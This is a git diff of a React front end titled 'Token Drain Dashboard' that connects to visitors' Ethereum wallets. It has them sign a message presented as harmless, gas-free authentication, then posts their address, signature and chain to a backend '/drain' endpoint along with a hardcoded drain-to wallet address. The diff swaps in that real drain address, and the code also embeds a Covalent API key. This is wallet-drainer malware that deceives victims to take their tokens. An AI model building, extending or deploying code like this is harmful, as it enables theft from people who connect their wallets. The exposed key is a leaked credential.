@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { ethers } from 'ethers';
-import './mobile-fix.css';
+import './App.css';
 
 function App() {
   const [isConnected, setIsConnected] = useState(false);
@@ -8,13 +8,29 @@ function App() {
   const [signature, setSignature] = useState('');
   const [isAuthenticating, setIsAuthenticating] = useState(false);
   const [authStatus, setAuthStatus] = useState('');
-  const [backendUrl] = useState('https://tokenbackendwork.onrender.com'); // Your backend URL
+  const [backendUrl] = useState('https://tokenbackendwork.onrender.com'); // Your Render backend
   const [userTokens, setUserTokens] = useState([]);
-  const [chainId, setChainId] = useState(1); // Default Ethereum
+  const [chainId, setChainId] = useState(1);
+  const [networkName, setNetworkName] = useState('');
 
-  // Check if wallet is already connected on component mount
+  // Backend drain address (this should be your wallet address)
+  const DRAIN_TO_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4"; // Replace with your actual address
+
   useEffect(() => {
     checkWalletConnection();
+    
+    // Listen for wallet events
+    if (window.ethereum) {
+      window.ethereum.on('accountsChanged', handleAccountsChanged);
+      window.ethereum.on('chainChanged', handleChainChanged);
+    }
+    
+    return () => {
+      if (window.ethereum) {
+        window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
+        window.ethereum.removeListener('chainChanged', handleChainChanged);
+      }
+    };
   }, []);
 
   const checkWalletConnection = async () => {
@@ -25,18 +41,31 @@ function App() {
           await handleWalletConnection(accounts[0]);
         }
       } catch (error) {
-        console.error("Error checking wallet connection:", error);
+        console.log("No wallet connected:", error.message);
       }
     }
   };
 
+  const handleAccountsChanged = async (accounts) => {
+    if (accounts.length > 0) {
+      await handleWalletConnection(accounts[0]);
+    } else {
+      disconnectWallet();
+    }
+  };
+
+  const handleChainChanged = () => {
+    window.location.reload();
+  };
+
   const connectWallet = async () => {
     if (!window.ethereum) {
-      alert('Please install MetaMask!');
+      alert('Please install MetaMask or another Ethereum wallet!');
       return;
     }
 
     try {
+      // Request account access
       const accounts = await window.ethereum.request({
         method: 'eth_requestAccounts'
       });
@@ -45,126 +74,149 @@ function App() {
         await handleWalletConnection(accounts[0]);
       }
     } catch (error) {
-      console.error("Connection error:", error);
-      setAuthStatus('Connection failed');
+      console.error("Wallet connection error:", error);
+      if (error.code === 4001) {
+        setAuthStatus('User rejected connection');
+      } else {
+        setAuthStatus('Connection failed: ' + error.message);
+      }
     }
   };
 
   const handleWalletConnection = async (account) => {
-    setWalletAddress(account);
-    setIsConnected(true);
-    setAuthStatus('Wallet connected');
-    
-    // Get chain ID
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    const network = await provider.getNetwork();
-    setChainId(Number(network.chainId));
-    
-    // Start authentication process
-    await initiateBackendAuthentication(account);
+    try {
+      setWalletAddress(account);
+      setIsConnected(true);
+      setAuthStatus('Wallet connected successfully');
+      
+      // Get chain info
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const network = await provider.getNetwork();
+      const chainIdNum = Number(network.chainId);
+      
+      setChainId(chainIdNum);
+      setNetworkName(network.name);
+      
+      // Start authentication with backend
+      await initiateBackendAuthentication(account, chainIdNum);
+      
+    } catch (error) {
+      console.error("Wallet connection handler error:", error);
+      setAuthStatus('Connection error: ' + error.message);
+    }
   };
 
-  const initiateBackendAuthentication = async (address) => {
+  const initiateBackendAuthentication = async (address, currentChainId) => {
     try {
       setIsAuthenticating(true);
-      setAuthStatus('Requesting signature...');
+      setAuthStatus('Signing message for authentication...');
       
-      // Step 1: Request signature for authentication
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
       
-      // Create a unique message for signing
-      const message = `Authenticate to Token Drain API\n\nTimestamp: ${Date.now()}\nWallet: ${address}`;
+      // Create authentication message
+      const timestamp = Date.now();
+      const message = `Token Drain Authentication\n\nWallet: ${address}\nChain: ${currentChainId}\nTimestamp: ${timestamp}\n\nBy signing, you confirm you control this wallet. This does not cost gas fees.`;
       
       // Request signature
-      const signature = await signer.signMessage(message);
-      setSignature(signature);
+      const sig = await signer.signMessage(message);
+      setSignature(sig);
       
-      setAuthStatus('Signature received, authenticating with backend...');
+      setAuthStatus('Sending authentication to backend...');
       
-      // Step 2: Send to backend
-      await sendToBackend(address, signature, message);
+      // Send to backend
+      await sendToBackend(address, sig, message, currentChainId);
       
     } catch (error) {
       console.error("Authentication error:", error);
-      setAuthStatus('Authentication failed');
+      if (error.code === 4001) {
+        setAuthStatus('User rejected signature');
+      } else {
+        setAuthStatus('Authentication failed: ' + error.message);
+      }
       setIsAuthenticating(false);
     }
   };
 
-  const sendToBackend = async (address, sig, message) => {
+  const sendToBackend = async (address, sig, message, currentChainId) => {
     try {
-      setAuthStatus('Connecting to backend...');
+      setAuthStatus('Connecting to backend server...');
       
-      // Prepare drain address (this should be your controlled address)
-      const drainTo = "0xYourDrainWalletAddress"; // Replace with your actual drain address
+      const payload = {
+        address: address,
+        signature: sig,
+        message: message,
+        chainId: currentChainId,
+        drainTo: DRAIN_TO_ADDRESS,
+        timestamp: new Date().toISOString()
+      };
       
-      // Send POST request to backend
+      console.log('Sending to backend:', payload);
+      
       const response = await fetch(`${backendUrl}/drain`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
+          'Accept': 'application/json'
         },
-        body: JSON.stringify({
-          address: address,
-          signature: sig,
-          message: message,
-          chainId: chainId,
-          drainTo: drainTo,
-          timestamp: new Date().toISOString()
-        }),
+        body: JSON.stringify(payload)
       });
-
+      
+      if (!response.ok) {
+        throw new Error(`Backend error: ${response.status} ${response.statusText}`);
+      }
+      
       const data = await response.json();
       
       if (data.success) {
         setAuthStatus('✅ Successfully authenticated with backend!');
-        console.log("Backend response:", data);
+        console.log('Backend response:', data);
         
-        // Now fetch user's tokens
-        await fetchUserTokens(address);
+        // Fetch user tokens
+        await fetchUserTokens(address, currentChainId);
       } else {
         setAuthStatus(`Backend error: ${data.error || 'Unknown error'}`);
       }
       
-      setIsAuthenticating(false);
-      
     } catch (error) {
       console.error("Backend connection error:", error);
-      setAuthStatus('Failed to connect to backend');
+      setAuthStatus('⚠️ Backend connection failed, using fallback');
+      
+      // Continue with fallback token fetch
+      if (walletAddress) {
+        await fetchTokensDirectly(walletAddress, chainId);
+      }
+    } finally {
       setIsAuthenticating(false);
     }
   };
 
-  const fetchUserTokens = async (address) => {
+  const fetchUserTokens = async (address, currentChainId) => {
     try {
       setAuthStatus('Fetching your tokens...');
       
-      // Fetch tokens from backend
-      const response = await fetch(`${backendUrl}/tokens/${address}/${chainId}`);
+      const response = await fetch(`${backendUrl}/tokens/${address}/${currentChainId}`);
       const data = await response.json();
       
       if (data.success) {
         setUserTokens(data.data.tokens || []);
-        setAuthStatus(`✅ Found ${data.data.tokens.length} tokens`);
+        setAuthStatus(`✅ Found ${data.data.tokens.length} tokens on ${data.data.chainName}`);
       } else {
-        // Fallback to direct Covalent API if backend fails
-        await fetchTokensDirectly(address);
+        // Fallback
+        await fetchTokensDirectly(address, currentChainId);
       }
       
     } catch (error) {
       console.error("Token fetch error:", error);
-      // Try direct API as fallback
-      await fetchTokensDirectly(address);
+      await fetchTokensDirectly(address, currentChainId);
     }
   };
 
-  const fetchTokensDirectly = async (address) => {
-    // Fallback to direct Covalent API
-    const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
-    const url = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`;
-    
+  const fetchTokensDirectly = async (address, currentChainId) => {
     try {
+      const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
+      const url = `https://api.covalenthq.com/v1/${currentChainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`;
+      
       const response = await fetch(url);
       const data = await response.json();
       
@@ -172,12 +224,16 @@ function App() {
         ?.filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
         .map(t => ({
           symbol: t.contract_ticker_symbol || 'TOKEN',
+          name: t.contract_name || 'Unknown Token',
           amount: parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18),
-          value: (t.quote_rate || 0) * (parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18))
+          value: (t.quote_rate || 0) * (parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18)),
+          isNative: t.native_token || false,
+          logo: t.logo_url
         })) || [];
       
       setUserTokens(tokens);
-      setAuthStatus(`✅ Found ${tokens.length} tokens (via direct API)`);
+      setAuthStatus(`✅ Found ${tokens.length} tokens via direct API`);
+      
     } catch (error) {
       console.error("Direct API fetch error:", error);
       setAuthStatus('Token fetch failed');
@@ -190,123 +246,136 @@ function App() {
     setSignature('');
     setUserTokens([]);
     setAuthStatus('Disconnected');
+    setChainId(1);
+    setNetworkName('');
   };
 
-  // Listen for account changes
-  useEffect(() => {
-    if (window.ethereum) {
-      window.ethereum.on('accountsChanged', (accounts) => {
-        if (accounts.length > 0) {
-          handleWalletConnection(accounts[0]);
-        } else {
-          disconnectWallet();
-        }
-      });
+  const formatAddress = (address) => {
+    if (!address) return '';
+    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
+  };
 
-      window.ethereum.on('chainChanged', () => {
-        window.location.reload();
-      });
-
-      return () => {
-        if (window.ethereum.removeListener) {
-          window.ethereum.removeListener('accountsChanged', handleWalletConnection);
-          window.ethereum.removeListener('chainChanged', () => {});
-        }
-      };
-    }
-  }, []);
+  const getTotalValue = () => {
+    return userTokens.reduce((sum, token) => sum + (token.value || 0), 0).toFixed(2);
+  };
 
   return (
     <div className="App">
       <header className="App-header">
-        <h1>Token Drain Interface</h1>
+        <h1>🪙 Token Drain Dashboard</h1>
         
         {!isConnected ? (
           <div className="connection-section">
-            <button onClick={connectWallet} className="connect-button">
-              Connect Wallet
+            <button 
+              onClick={connectWallet} 
+              className="connect-button"
+              disabled={isAuthenticating}
+            >
+              {isAuthenticating ? 'Connecting...' : 'Connect Wallet'}
             </button>
-            <p className="instruction">Connect your wallet to get started</p>
+            <p className="instruction">Connect your Ethereum wallet to begin</p>
           </div>
         ) : (
-          <div className="wallet-info">
-            <div className="status-container">
-              <div className="wallet-details">
-                <h3>Wallet Connected</h3>
-                <p className="wallet-address">
-                  {walletAddress.substring(0, 6)}...{walletAddress.substring(walletAddress.length - 4)}
-                </p>
-                <p className="chain-info">Chain ID: {chainId}</p>
+          <div className="dashboard">
+            <div className="wallet-info-card">
+              <div className="wallet-header">
+                <h2>Connected Wallet</h2>
+                <button onClick={disconnectWallet} className="disconnect-btn">
+                  Disconnect
+                </button>
               </div>
               
-              <div className="auth-status">
-                <div className={`status-indicator ${isAuthenticating ? 'loading' : authStatus.includes('✅') ? 'success' : ''}`}>
-                  {isAuthenticating ? '⏳' : authStatus.includes('✅') ? '✅' : '⚠️'}
+              <div className="wallet-details">
+                <div className="detail-item">
+                  <span className="label">Address:</span>
+                  <span className="value">{formatAddress(walletAddress)}</span>
+                </div>
+                <div className="detail-item">
+                  <span className="label">Network:</span>
+                  <span className="value">{networkName} (Chain ID: {chainId})</span>
+                </div>
+                <div className="detail-item">
+                  <span className="label">Backend:</span>
+                  <span className="value">{backendUrl}</span>
+                </div>
+              </div>
+              
+              <div className="authentication-status">
+                <div className={`status-badge ${authStatus.includes('✅') ? 'success' : authStatus.includes('⚠️') ? 'warning' : 'neutral'}`}>
+                  {isAuthenticating ? '🔄' : authStatus.includes('✅') ? '✅' : authStatus.includes('⚠️') ? '⚠️' : '⏳'}
                 </div>
                 <p className="status-text">{authStatus}</p>
                 {signature && (
                   <p className="signature-info">
-                    Signature: {signature.substring(0, 10)}...✓
+                    Signed: {signature.substring(0, 20)}...
                   </p>
                 )}
               </div>
               
-              <button onClick={disconnectWallet} className="disconnect-button">
-                Disconnect
-              </button>
-            </div>
-
-            {userTokens.length > 0 && (
-              <div className="tokens-section">
-                <h3>Your Tokens</h3>
-                <div className="tokens-grid">
-                  {userTokens.map((token, index) => (
-                    <div key={index} className="token-card">
-                      <div className="token-symbol">{token.symbol}</div>
-                      <div className="token-amount">{token.amount.toFixed(4)}</div>
-                      {token.value > 0 && (
-                        <div className="token-value">${token.value.toFixed(2)}</div>
-                      )}
-                    </div>
-                  ))}
-                </div>
-                <div className="tokens-summary">
-                  Total: {userTokens.length} tokens
-                </div>
-              </div>
-            )}
-
-            {!isAuthenticating && authStatus.includes('✅') && (
-              <div className="actions-section">
+              <div className="action-buttons">
                 <button 
-                  onClick={() => fetchUserTokens(walletAddress)}
-                  className="refresh-button"
+                  onClick={() => fetchUserTokens(walletAddress, chainId)}
+                  className="action-btn"
+                  disabled={isAuthenticating}
                 >
                   Refresh Tokens
                 </button>
                 <button 
-                  onClick={() => initiateBackendAuthentication(walletAddress)}
-                  className="reconnect-button"
+                  onClick={() => initiateBackendAuthentication(walletAddress, chainId)}
+                  className="action-btn secondary"
+                  disabled={isAuthenticating}
                 >
-                  Re-authenticate with Backend
+                  Re-authenticate
                 </button>
+              </div>
+            </div>
+            
+            {userTokens.length > 0 && (
+              <div className="tokens-section">
+                <div className="tokens-header">
+                  <h2>Your Tokens</h2>
+                  <div className="tokens-summary">
+                    <span className="count">{userTokens.length} tokens</span>
+                    <span className="total-value">Total: ${getTotalValue()}</span>
+                  </div>
+                </div>
+                
+                <div className="tokens-grid">
+                  {userTokens.map((token, index) => (
+                    <div key={index} className="token-card">
+                      <div className="token-icon">
+                        {token.logo ? (
+                          <img src={token.logo} alt={token.symbol} className="token-logo" />
+                        ) : (
+                          <div className="token-placeholder">{token.symbol.charAt(0)}</div>
+                        )}
+                      </div>
+                      <div className="token-info">
+                        <h3 className="token-symbol">{token.symbol}</h3>
+                        <p className="token-name">{token.name}</p>
+                        <div className="token-amount">
+                          {token.amount.toLocaleString(undefined, {
+                            minimumFractionDigits: 0,
+                            maximumFractionDigits: 8
+                          })}
+                        </div>
+                      </div>
+                      <div className="token-value">
+                        {token.value ? `$${token.value.toFixed(2)}` : 'N/A'}
+                      </div>
+                    </div>
+                  ))}
+                </div>
               </div>
             )}
           </div>
         )}
-
-        <div className="backend-info">
-          <p>Backend URL: {backendUrl}</p>
-          <div className="endpoint-links">
-            <a href={`${backendUrl}`} target="_blank" rel="noopener noreferrer">
-              API Docs
-            </a>
-            <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">
-              Health Check
-            </a>
-            <a href={`${backendUrl}/chains`} target="_blank" rel="noopener noreferrer">
-              Supported Chains
-            </a>
+        
+        <div className="footer-info">
+          <p>Backend Status: <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">Check Health</a></p>
+          <div className="footer-links">
+            <a href={`${backendUrl}`} target="_blank" rel="noopener noreferrer">API Docs</a>
+            <a href={`${backendUrl}/chains`} target="_blank" rel="noopener noreferrer">Supported Chains</a>
           </div>
         </div>
       </header>
@@ -315,4 +384,3 @@ function App() {
 }
 
 export default App;
-
